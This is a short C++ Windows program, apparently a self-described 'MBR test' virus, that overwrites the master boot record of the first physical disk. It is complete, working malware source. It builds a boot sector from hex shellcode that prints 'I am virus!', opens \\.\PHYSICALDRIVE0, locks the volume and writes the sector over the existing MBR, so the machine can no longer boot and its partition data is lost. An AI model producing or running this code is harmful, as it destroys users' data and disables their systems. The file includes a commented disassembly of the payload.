// mbr.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <windows.h>
#include <winioctl.h>


unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xee\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x57\x4e\x54\x20\x4d\x42\x52\x20\x74\x65\x73\x74\x69\x6e\x67\x21";

/*
00000000  B81200 mov ax, 12H ; ah = 0, al = 12h (640 * 480)
00000003  CD10 int 10h ; 进入图形显示方式，隐藏光标
00000005  BD187C mov bp, Msg ; ES:BP = 串地址
00000008  B91800 mov cx, 18h ; CX = 串长度
0000000B  B80113 mov ax, 1301h ; AH = 13,  AL = 01h
0000000E  BB0C00 mov bx, 000ch ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
00000011  BA1D0E mov dx, 0e1dh ; dh行, dl列
00000014  CD10 int 10h ; 10h 号中断
00000016  E2FE loop $
Msg: db "I am virus! WNT MBR test! :-)"
*/
int  main()
{
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = { 0 };

	// 重新构造MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;

	hDevice = CreateFile
	(
		L"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl
	(
		hDevice,
		FSCTL_LOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);
	// 写入病毒内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
	(
		hDevice,
		FSCTL_UNLOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);
	CloseHandle(hDevice);
	return 0;
}




// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
